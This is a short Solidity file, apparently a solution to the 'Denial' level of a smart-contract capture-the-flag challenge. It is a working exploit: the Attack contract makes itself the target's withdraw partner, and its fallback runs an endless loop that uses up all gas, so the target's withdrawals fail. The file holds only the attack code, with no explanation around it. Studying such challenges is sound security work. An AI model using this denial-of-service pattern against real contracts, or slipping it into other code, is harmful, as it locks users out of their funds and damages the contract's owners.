pragma solidity ^0.8;

interface IDenial {
  function setWithdrawPartner(address) external;
}

contract Attack {
  constructor(IDenial target) {
    target.setWithdrawPartner(address(this));
  }

  fallback() external payable {
    while (true) {}
  }
}
